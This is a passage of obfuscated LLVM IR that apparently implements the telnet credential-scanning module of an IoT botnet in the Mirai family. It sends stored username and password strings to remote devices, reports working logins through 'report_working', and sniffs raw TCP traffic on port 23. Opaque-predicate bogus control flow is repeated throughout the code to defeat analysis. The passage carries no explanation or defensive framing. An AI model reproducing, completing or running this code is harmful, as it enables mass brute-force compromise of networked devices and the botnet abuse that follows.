  %1376 = urem i32 %1375, 2
  %1377 = icmp eq i32 %1376, 0
  %1378 = icmp slt i32 %1373, 10
  %1379 = or i1 %1377, %1378
  br i1 %1379, label %originalBBpart2184, label %originalBB182alteredBB

originalBBpart2184:                               ; preds = %originalBB182
  br label %1690

; <label>:1380:                                   ; preds = %1250
  %1381 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1382 = call i32 @consume_any_prompt(%struct.scanner_connection* %1381)
  store i32 %1382, i32* %33, align 4
  %1383 = icmp sgt i32 %1382, 0
  br i1 %1383, label %1384, label %1415

; <label>:1384:                                   ; preds = %1380
  %1385 = load i32, i32* @x.53
  %1386 = load i32, i32* @y.54
  %1387 = sub i32 %1385, 1
  %1388 = mul i32 %1385, %1387
  %1389 = urem i32 %1388, 2
  %1390 = icmp eq i32 %1389, 0
  %1391 = icmp slt i32 %1386, 10
  %1392 = or i1 %1390, %1391
  br i1 %1392, label %originalBB186, label %originalBB186alteredBB

originalBB186:                                    ; preds = %originalBB186alteredBB, %1384
  call void @table_unlock_val(i8 zeroext 5)
  %1393 = call i8* @table_retrieve_val(i32 5, i32* %35)
  store i8* %1393, i8** %34, align 8
  %1394 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1395 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1394, i32 0, i32 1
  %1396 = load i32, i32* %1395, align 8
  %1397 = load i8*, i8** %34, align 8
  %1398 = load i32, i32* %35, align 4
  %1399 = sext i32 %1398 to i64
  %1400 = call i64 @send(i32 %1396, i8* %1397, i64 %1399, i32 16384)
  %1401 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1402 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1401, i32 0, i32 1
  %1403 = load i32, i32* %1402, align 8
  %1404 = call i64 @send(i32 %1403, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.32, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 5)
  %1405 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1406 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1405, i32 0, i32 3
  store i32 6, i32* %1406, align 8
  %1407 = load i32, i32* @x.53
  %1408 = load i32, i32* @y.54
  %1409 = sub i32 %1407, 1
  %1410 = mul i32 %1407, %1409
  %1411 = urem i32 %1410, 2
  %1412 = icmp eq i32 %1411, 0
  %1413 = icmp slt i32 %1408, 10
  %1414 = or i1 %1412, %1413
  br i1 %1414, label %originalBBpart2188, label %originalBB186alteredBB

originalBBpart2188:                               ; preds = %originalBB186
  br label %1415

; <label>:1415:                                   ; preds = %originalBBpart2188, %1380
  %1416 = load i32, i32* @x.53
  %1417 = load i32, i32* @y.54
  %1418 = sub i32 %1416, 1
  %1419 = mul i32 %1416, %1418
  %1420 = urem i32 %1419, 2
  %1421 = icmp eq i32 %1420, 0
  %1422 = icmp slt i32 %1417, 10
  %1423 = or i1 %1421, %1422
  br i1 %1423, label %originalBB190, label %originalBB190alteredBB

originalBB190:                                    ; preds = %originalBB190alteredBB, %1415
  %1424 = load i32, i32* @x.53
  %1425 = load i32, i32* @y.54
  %1426 = sub i32 %1424, 1
  %1427 = mul i32 %1424, %1426
  %1428 = urem i32 %1427, 2
  %1429 = icmp eq i32 %1428, 0
  %1430 = icmp slt i32 %1425, 10
  %1431 = or i1 %1429, %1430
  br i1 %1431, label %originalBBpart2192, label %originalBB190alteredBB

originalBBpart2192:                               ; preds = %originalBB190
  br label %1690

; <label>:1432:                                   ; preds = %1250
  %1433 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1434 = call i32 @consume_any_prompt(%struct.scanner_connection* %1433)
  store i32 %1434, i32* %33, align 4
  %1435 = icmp sgt i32 %1434, 0
  br i1 %1435, label %1436, label %1451

; <label>:1436:                                   ; preds = %1432
  call void @table_unlock_val(i8 zeroext 6)
  %1437 = call i8* @table_retrieve_val(i32 6, i32* %37)
  store i8* %1437, i8** %36, align 8
  %1438 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1439 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1438, i32 0, i32 1
  %1440 = load i32, i32* %1439, align 8
  %1441 = load i8*, i8** %36, align 8
  %1442 = load i32, i32* %37, align 4
  %1443 = sext i32 %1442 to i64
  %1444 = call i64 @send(i32 %1440, i8* %1441, i64 %1443, i32 16384)
  %1445 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1446 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1445, i32 0, i32 1
  %1447 = load i32, i32* %1446, align 8
  %1448 = call i64 @send(i32 %1447, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.32, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 6)
  %1449 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1450 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1449, i32 0, i32 3
  store i32 7, i32* %1450, align 8
  br label %1451

; <label>:1451:                                   ; preds = %1436, %1432
  %1452 = load i32, i32* @x.53
  %1453 = load i32, i32* @y.54
  %1454 = sub i32 %1452, 1
  %1455 = mul i32 %1452, %1454
  %1456 = urem i32 %1455, 2
  %1457 = icmp eq i32 %1456, 0
  %1458 = icmp slt i32 %1453, 10
  %1459 = or i1 %1457, %1458
  br i1 %1459, label %originalBB194, label %originalBB194alteredBB

originalBB194:                                    ; preds = %originalBB194alteredBB, %1451
  %1460 = load i32, i32* @x.53
  %1461 = load i32, i32* @y.54
  %1462 = sub i32 %1460, 1
  %1463 = mul i32 %1460, %1462
  %1464 = urem i32 %1463, 2
  %1465 = icmp eq i32 %1464, 0
  %1466 = icmp slt i32 %1461, 10
  %1467 = or i1 %1465, %1466
  br i1 %1467, label %originalBBpart2196, label %originalBB194alteredBB

originalBBpart2196:                               ; preds = %originalBB194
  br label %1690

; <label>:1468:                                   ; preds = %1250
  %1469 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1470 = call i32 @consume_any_prompt(%struct.scanner_connection* %1469)
  store i32 %1470, i32* %33, align 4
  %1471 = icmp sgt i32 %1470, 0
  br i1 %1471, label %1472, label %1503

; <label>:1472:                                   ; preds = %1468
  %1473 = load i32, i32* @x.53
  %1474 = load i32, i32* @y.54
  %1475 = sub i32 %1473, 1
  %1476 = mul i32 %1473, %1475
  %1477 = urem i32 %1476, 2
  %1478 = icmp eq i32 %1477, 0
  %1479 = icmp slt i32 %1474, 10
  %1480 = or i1 %1478, %1479
  br i1 %1480, label %originalBB198, label %originalBB198alteredBB

originalBB198:                                    ; preds = %originalBB198alteredBB, %1472
  call void @table_unlock_val(i8 zeroext 4)
  %1481 = call i8* @table_retrieve_val(i32 4, i32* %39)
  store i8* %1481, i8** %38, align 8
  %1482 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1483 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1482, i32 0, i32 1
  %1484 = load i32, i32* %1483, align 8
  %1485 = load i8*, i8** %38, align 8
  %1486 = load i32, i32* %39, align 4
  %1487 = sext i32 %1486 to i64
  %1488 = call i64 @send(i32 %1484, i8* %1485, i64 %1487, i32 16384)
  %1489 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1490 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1489, i32 0, i32 1
  %1491 = load i32, i32* %1490, align 8
  %1492 = call i64 @send(i32 %1491, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.32, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 4)
  %1493 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1494 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1493, i32 0, i32 3
  store i32 8, i32* %1494, align 8
  %1495 = load i32, i32* @x.53
  %1496 = load i32, i32* @y.54
  %1497 = sub i32 %1495, 1
  %1498 = mul i32 %1495, %1497
  %1499 = urem i32 %1498, 2
  %1500 = icmp eq i32 %1499, 0
  %1501 = icmp slt i32 %1496, 10
  %1502 = or i1 %1500, %1501
  br i1 %1502, label %originalBBpart2200, label %originalBB198alteredBB

originalBBpart2200:                               ; preds = %originalBB198
  br label %1503

; <label>:1503:                                   ; preds = %originalBBpart2200, %1468
  br label %1690

; <label>:1504:                                   ; preds = %1250
  %1505 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1506 = call i32 @consume_any_prompt(%struct.scanner_connection* %1505)
  store i32 %1506, i32* %33, align 4
  %1507 = icmp sgt i32 %1506, 0
  br i1 %1507, label %1508, label %1523

; <label>:1508:                                   ; preds = %1504
  call void @table_unlock_val(i8 zeroext 7)
  %1509 = call i8* @table_retrieve_val(i32 7, i32* %41)
  store i8* %1509, i8** %40, align 8
  %1510 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1511 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1510, i32 0, i32 1
  %1512 = load i32, i32* %1511, align 8
  %1513 = load i8*, i8** %40, align 8
  %1514 = load i32, i32* %41, align 4
  %1515 = sext i32 %1514 to i64
  %1516 = call i64 @send(i32 %1512, i8* %1513, i64 %1515, i32 16384)
  %1517 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1518 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1517, i32 0, i32 1
  %1519 = load i32, i32* %1518, align 8
  %1520 = call i64 @send(i32 %1519, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.32, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 7)
  %1521 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1522 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1521, i32 0, i32 3
  store i32 9, i32* %1522, align 8
  br label %1523

; <label>:1523:                                   ; preds = %1508, %1504
  %1524 = load i32, i32* @x.53
  %1525 = load i32, i32* @y.54
  %1526 = sub i32 %1524, 1
  %1527 = mul i32 %1524, %1526
  %1528 = urem i32 %1527, 2
  %1529 = icmp eq i32 %1528, 0
  %1530 = icmp slt i32 %1525, 10
  %1531 = or i1 %1529, %1530
  br i1 %1531, label %originalBB202, label %originalBB202alteredBB

originalBB202:                                    ; preds = %originalBB202alteredBB, %1523
  %1532 = load i32, i32* @x.53
  %1533 = load i32, i32* @y.54
  %1534 = sub i32 %1532, 1
  %1535 = mul i32 %1532, %1534
  %1536 = urem i32 %1535, 2
  %1537 = icmp eq i32 %1536, 0
  %1538 = icmp slt i32 %1533, 10
  %1539 = or i1 %1537, %1538
  br i1 %1539, label %originalBBpart2204, label %originalBB202alteredBB

originalBBpart2204:                               ; preds = %originalBB202
  br label %1690

; <label>:1540:                                   ; preds = %1250
  %1541 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1542 = call i32 @consume_any_prompt(%struct.scanner_connection* %1541)
  store i32 %1542, i32* %33, align 4
  %1543 = icmp sgt i32 %1542, 0
  br i1 %1543, label %1544, label %1559

; <label>:1544:                                   ; preds = %1540
  call void @table_unlock_val(i8 zeroext 8)
  %1545 = call i8* @table_retrieve_val(i32 8, i32* %43)
  store i8* %1545, i8** %42, align 8
  %1546 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1547 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1546, i32 0, i32 1
  %1548 = load i32, i32* %1547, align 8
  %1549 = load i8*, i8** %42, align 8
  %1550 = load i32, i32* %43, align 4
  %1551 = sext i32 %1550 to i64
  %1552 = call i64 @send(i32 %1548, i8* %1549, i64 %1551, i32 16384)
  %1553 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1554 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1553, i32 0, i32 1
  %1555 = load i32, i32* %1554, align 8
  %1556 = call i64 @send(i32 %1555, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.32, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 8)
  %1557 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1558 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1557, i32 0, i32 3
  store i32 10, i32* %1558, align 8
  br label %1559

; <label>:1559:                                   ; preds = %1544, %1540
  %1560 = load i32, i32* @x.53
  %1561 = load i32, i32* @y.54
  %1562 = sub i32 %1560, 1
  %1563 = mul i32 %1560, %1562
  %1564 = urem i32 %1563, 2
  %1565 = icmp eq i32 %1564, 0
  %1566 = icmp slt i32 %1561, 10
  %1567 = or i1 %1565, %1566
  br i1 %1567, label %originalBB206, label %originalBB206alteredBB

originalBB206:                                    ; preds = %originalBB206alteredBB, %1559
  %1568 = load i32, i32* @x.53
  %1569 = load i32, i32* @y.54
  %1570 = sub i32 %1568, 1
  %1571 = mul i32 %1568, %1570
  %1572 = urem i32 %1571, 2
  %1573 = icmp eq i32 %1572, 0
  %1574 = icmp slt i32 %1569, 10
  %1575 = or i1 %1573, %1574
  br i1 %1575, label %originalBBpart2208, label %originalBB206alteredBB

originalBBpart2208:                               ; preds = %originalBB206
  br label %1690

; <label>:1576:                                   ; preds = %1250
  %1577 = load i32, i32* @x.53
  %1578 = load i32, i32* @y.54
  %1579 = sub i32 %1577, 1
  %1580 = mul i32 %1577, %1579
  %1581 = urem i32 %1580, 2
  %1582 = icmp eq i32 %1581, 0
  %1583 = icmp slt i32 %1578, 10
  %1584 = or i1 %1582, %1583
  br i1 %1584, label %originalBB210, label %originalBB210alteredBB

originalBB210:                                    ; preds = %originalBB210alteredBB, %1576
  %1585 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1586 = call i32 @consume_resp_prompt(%struct.scanner_connection* %1585)
  store i32 %1586, i32* %33, align 4
  %1587 = load i32, i32* %33, align 4
  %1588 = icmp eq i32 %1587, -1
  %1589 = load i32, i32* @x.53
  %1590 = load i32, i32* @y.54
  %1591 = sub i32 %1589, 1
  %1592 = mul i32 %1589, %1591
  %1593 = urem i32 %1592, 2
  %1594 = icmp eq i32 %1593, 0
  %1595 = icmp slt i32 %1590, 10
  %1596 = or i1 %1594, %1595
  br i1 %1596, label %originalBBpart2212, label %originalBB210alteredBB

originalBBpart2212:                               ; preds = %originalBB210
  br i1 %1588, label %1597, label %1634

; <label>:1597:                                   ; preds = %originalBBpart2212
  %1598 = load i32, i32* @x.53
  %1599 = load i32, i32* @y.54
  %1600 = sub i32 %1598, 1
  %1601 = mul i32 %1598, %1600
  %1602 = urem i32 %1601, 2
  %1603 = icmp eq i32 %1602, 0
  %1604 = icmp slt i32 %1599, 10
  %1605 = or i1 %1603, %1604
  br i1 %1605, label %originalBB214, label %originalBB214alteredBB

originalBB214:                                    ; preds = %originalBB214alteredBB, %1597
  %1606 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1607 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1606, i32 0, i32 1
  %1608 = load i32, i32* %1607, align 8
  %1609 = call i32 @close(i32 %1608)
  %1610 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1611 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1610, i32 0, i32 1
  store i32 -1, i32* %1611, align 8
  %1612 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1613 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1612, i32 0, i32 8
  %1614 = load i8, i8* %1613, align 8
  %1615 = add i8 %1614, 1
  store i8 %1615, i8* %1613, align 8
  %1616 = zext i8 %1615 to i32
  %1617 = icmp eq i32 %1616, 10
  %1618 = load i32, i32* @x.53
  %1619 = load i32, i32* @y.54
  %1620 = sub i32 %1618, 1
  %1621 = mul i32 %1618, %1620
  %1622 = urem i32 %1621, 2
  %1623 = icmp eq i32 %1622, 0
  %1624 = icmp slt i32 %1619, 10
  %1625 = or i1 %1623, %1624
  br i1 %1625, label %originalBBpart2231, label %originalBB214alteredBB

originalBBpart2231:                               ; preds = %originalBB214
  br i1 %1617, label %1626, label %1631

; <label>:1626:                                   ; preds = %originalBBpart2231
  %1627 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1628 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1627, i32 0, i32 8
  store i8 0, i8* %1628, align 8
  %1629 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1630 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1629, i32 0, i32 3
  store i32 0, i32* %1630, align 8
  br label %1633

; <label>:1631:                                   ; preds = %originalBBpart2231
  %1632 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  call void @setup_connection(%struct.scanner_connection* %1632)
  br label %1633

; <label>:1633:                                   ; preds = %1631, %1626
  br label %1672

; <label>:1634:                                   ; preds = %originalBBpart2212
  %1635 = load i32, i32* %33, align 4
  %1636 = icmp sgt i32 %1635, 0
  br i1 %1636, label %1637, label %1655

; <label>:1637:                                   ; preds = %1634
  %1638 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1639 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1638, i32 0, i32 4
  %1640 = load i32, i32* %1639, align 4
  %1641 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1642 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1641, i32 0, i32 5
  %1643 = load i16, i16* %1642, align 8
  %1644 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1645 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1644, i32 0, i32 0
  %1646 = load %struct.scanner_auth*, %struct.scanner_auth** %1645, align 8
  call void @report_working(i32 %1640, i16 zeroext %1643, %struct.scanner_auth* %1646)
  %1647 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1648 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1647, i32 0, i32 1
  %1649 = load i32, i32* %1648, align 8
  %1650 = call i32 @close(i32 %1649)
  %1651 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1652 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1651, i32 0, i32 1
  store i32 -1, i32* %1652, align 8
  %1653 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1654 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1653, i32 0, i32 3
  store i32 0, i32* %1654, align 8
  br label %1655

; <label>:1655:                                   ; preds = %1637, %1634
  %1656 = load i32, i32* @x.53
  %1657 = load i32, i32* @y.54
  %1658 = sub i32 %1656, 1
  %1659 = mul i32 %1656, %1658
  %1660 = urem i32 %1659, 2
  %1661 = icmp eq i32 %1660, 0
  %1662 = icmp slt i32 %1657, 10
  %1663 = or i1 %1661, %1662
  br i1 %1663, label %originalBB233, label %originalBB233alteredBB

originalBB233:                                    ; preds = %originalBB233alteredBB, %1655
  %1664 = load i32, i32* @x.53
  %1665 = load i32, i32* @y.54
  %1666 = sub i32 %1664, 1
  %1667 = mul i32 %1664, %1666
  %1668 = urem i32 %1667, 2
  %1669 = icmp eq i32 %1668, 0
  %1670 = icmp slt i32 %1665, 10
  %1671 = or i1 %1669, %1670
  br i1 %1671, label %originalBBpart2235, label %originalBB233alteredBB

originalBBpart2235:                               ; preds = %originalBB233
  br label %1672

; <label>:1672:                                   ; preds = %originalBBpart2235, %1633
  br label %1690

; <label>:1673:                                   ; preds = %1250
  %1674 = load i32, i32* @x.53
  %1675 = load i32, i32* @y.54
  %1676 = sub i32 %1674, 1
  %1677 = mul i32 %1674, %1676
  %1678 = urem i32 %1677, 2
  %1679 = icmp eq i32 %1678, 0
  %1680 = icmp slt i32 %1675, 10
  %1681 = or i1 %1679, %1680
  br i1 %1681, label %originalBB237, label %originalBB237alteredBB

originalBB237:                                    ; preds = %originalBB237alteredBB, %1673
  store i32 0, i32* %33, align 4
  %1682 = load i32, i32* @x.53
  %1683 = load i32, i32* @y.54
  %1684 = sub i32 %1682, 1
  %1685 = mul i32 %1682, %1684
  %1686 = urem i32 %1685, 2
  %1687 = icmp eq i32 %1686, 0
  %1688 = icmp slt i32 %1683, 10
  %1689 = or i1 %1687, %1688
  br i1 %1689, label %originalBBpart2239, label %originalBB237alteredBB

originalBBpart2239:                               ; preds = %originalBB237
  br label %1690

; <label>:1690:                                   ; preds = %originalBBpart2239, %1672, %originalBBpart2208, %originalBBpart2204, %1503, %originalBBpart2196, %originalBBpart2192, %originalBBpart2184, %1304, %1277
  %1691 = load i32, i32* %33, align 4
  %1692 = icmp eq i32 %1691, 0
  br i1 %1692, label %1693, label %1694

; <label>:1693:                                   ; preds = %1690
  br label %1740

; <label>:1694:                                   ; preds = %1690
  %1695 = load i32, i32* %33, align 4
  %1696 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1697 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1696, i32 0, i32 6
  %1698 = load i32, i32* %1697, align 4
  %1699 = icmp sgt i32 %1695, %1698
  br i1 %1699, label %1700, label %1704

; <label>:1700:                                   ; preds = %1694
  %1701 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1702 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1701, i32 0, i32 6
  %1703 = load i32, i32* %1702, align 4
  store i32 %1703, i32* %33, align 4
  br label %1704

; <label>:1704:                                   ; preds = %1700, %1694
  %1705 = load i32, i32* %33, align 4
  %1706 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1707 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1706, i32 0, i32 6
  %1708 = load i32, i32* %1707, align 4
  %1709 = sub nsw i32 %1708, %1705
  store i32 %1709, i32* %1707, align 4
  %1710 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1711 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1710, i32 0, i32 7
  %1712 = getelementptr inbounds [256 x i8], [256 x i8]* %1711, i32 0, i32 0
  %1713 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1714 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1713, i32 0, i32 7
  %1715 = getelementptr inbounds [256 x i8], [256 x i8]* %1714, i32 0, i32 0
  %1716 = load i32, i32* %33, align 4
  %1717 = sext i32 %1716 to i64
  %1718 = getelementptr inbounds i8, i8* %1715, i64 %1717
  %1719 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1720 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1719, i32 0, i32 6
  %1721 = load i32, i32* %1720, align 4
  %1722 = sext i32 %1721 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %1712, i8* %1718, i64 %1722, i32 1, i1 false)
  br label %1723

; <label>:1723:                                   ; preds = %1704
  %1724 = load i32, i32* @x.53
  %1725 = load i32, i32* @y.54
  %1726 = sub i32 %1724, 1
  %1727 = mul i32 %1724, %1726
  %1728 = urem i32 %1727, 2
  %1729 = icmp eq i32 %1728, 0
  %1730 = icmp slt i32 %1725, 10
  %1731 = or i1 %1729, %1730
  br i1 %1731, label %originalBB241, label %originalBB241alteredBB

originalBB241:                                    ; preds = %originalBB241alteredBB, %1723
  %1732 = load i32, i32* @x.53
  %1733 = load i32, i32* @y.54
  %1734 = sub i32 %1732, 1
  %1735 = mul i32 %1732, %1734
  %1736 = urem i32 %1735, 2
  %1737 = icmp eq i32 %1736, 0
  %1738 = icmp slt i32 %1733, 10
  %1739 = or i1 %1737, %1738
  br i1 %1739, label %originalBBpart2243, label %originalBB241alteredBB

originalBBpart2243:                               ; preds = %originalBB241
  br label %1250

; <label>:1740:                                   ; preds = %1693
  br label %1083

; <label>:1741:                                   ; preds = %1224, %1088
  %1742 = load i32, i32* @x.53
  %1743 = load i32, i32* @y.54
  %1744 = sub i32 %1742, 1
  %1745 = mul i32 %1742, %1744
  %1746 = urem i32 %1745, 2
  %1747 = icmp eq i32 %1746, 0
  %1748 = icmp slt i32 %1743, 10
  %1749 = or i1 %1747, %1748
  br i1 %1749, label %originalBB245, label %originalBB245alteredBB

originalBB245:                                    ; preds = %originalBB245alteredBB, %1741
  %1750 = load i32, i32* @x.53
  %1751 = load i32, i32* @y.54
  %1752 = sub i32 %1750, 1
  %1753 = mul i32 %1750, %1752
  %1754 = urem i32 %1753, 2
  %1755 = icmp eq i32 %1754, 0
  %1756 = icmp slt i32 %1751, 10
  %1757 = or i1 %1755, %1756
  br i1 %1757, label %originalBBpart2247, label %originalBB245alteredBB

originalBBpart2247:                               ; preds = %originalBB245
  br label %1758

; <label>:1758:                                   ; preds = %originalBBpart2247, %1049
  br label %1759

; <label>:1759:                                   ; preds = %1758, %1037, %1000
  %1760 = load i32, i32* @x.53
  %1761 = load i32, i32* @y.54
  %1762 = sub i32 %1760, 1
  %1763 = mul i32 %1760, %1762
  %1764 = urem i32 %1763, 2
  %1765 = icmp eq i32 %1764, 0
  %1766 = icmp slt i32 %1761, 10
  %1767 = or i1 %1765, %1766
  br i1 %1767, label %originalBB249, label %originalBB249alteredBB

originalBB249:                                    ; preds = %originalBB249alteredBB, %1759
  %1768 = load i32, i32* %1, align 4
  %1769 = add nsw i32 %1768, 1
  store i32 %1769, i32* %1, align 4
  %1770 = load i32, i32* @x.53
  %1771 = load i32, i32* @y.54
  %1772 = sub i32 %1770, 1
  %1773 = mul i32 %1770, %1772
  %1774 = urem i32 %1773, 2
  %1775 = icmp eq i32 %1774, 0
  %1776 = icmp slt i32 %1771, 10
  %1777 = or i1 %1775, %1776
  br i1 %1777, label %originalBBpart2268, label %originalBB249alteredBB

originalBBpart2268:                               ; preds = %originalBB249
  br label %988

; <label>:1778:                                   ; preds = %988
  br label %213

originalBBalteredBB:                              ; preds = %originalBB, %52
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %92
  %1779 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %1779, i32* @rsck, align 4
  %1780 = icmp eq i32 %1779, -1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %111
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %138
  %1781 = load i32, i32* @rsck, align 4
  %1782 = call i32 @close(i32 %1781)
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %213
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %1783 = load i32, i32* @fake_time, align 4
  %1784 = load i32, i32* %10, align 4
  %1785 = icmp ne i32 %1783, %1784
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %314
  %1786 = call i32* @__errno_location() #7
  %1787 = load i32, i32* %1786, align 4
  %1788 = icmp eq i32 %1787, 11
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %338
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %355
  %1789 = load i32, i32* %18, align 4
  %1790 = sext i32 %1789 to i64
  %1791 = icmp ult i64 %1790, 40
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %376
  %1792 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %1793 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %1792, i32 0, i32 9
  %1794 = load i32, i32* %1793, align 4
  %1795 = load i32, i32* @LOCAL_ADDR, align 4
  %1796 = icmp ne i32 %1794, %1795
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %398
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %415
  %1797 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %1798 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %1797, i32 0, i32 6
  %1799 = load i8, i8* %1798, align 1
  %1800 = zext i8 %1799 to i32
  %1801 = icmp ne i32 %1800, 6
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %438
  %1802 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %1803 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1802, i32 0, i32 0
  %1804 = load i16, i16* %1803, align 4
  %1805 = zext i16 %1804 to i32
  %1806 = call zeroext i16 @htons(i16 zeroext 23) #7
  %1807 = zext i16 %1806 to i32
  %1808 = icmp ne i32 %1805, %1807
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %480
  %1809 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %1810 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1809, i32 0, i32 4
  %1811 = load i16, i16* %1810, align 4
  %_ = sub i16 %1811, 12
  %gen = mul i16 %_, 12
  %_47 = sub i16 %1811, 12
  %gen48 = mul i16 %_47, 12
  %_49 = sub i16 0, %1811
  %gen50 = add i16 %_49, 12
  %_51 = sub i16 0, %1811
  %gen52 = add i16 %_51, 12
  %_53 = shl i16 %1811, 12
  %1812 = lshr i16 %1811, 12
  %_54 = shl i16 %1812, 1
  %_55 = sub i16 0, %1812
  %gen56 = add i16 %_55, 1
  %1813 = and i16 %1812, 1
  %1814 = icmp ne i16 %1813, 0
  br label %originalBB46

originalBB60alteredBB:                            ; preds = %originalBB60, %511
  br label %originalBB60

originalBB64alteredBB:                            ; preds = %originalBB64, %536
  %1815 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %1816 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1815, i32 0, i32 3
  %1817 = load i32, i32* %1816, align 4
  %1818 = call i32 @ntohl(i32 %1817) #7
  %_65 = shl i32 %1818, 1
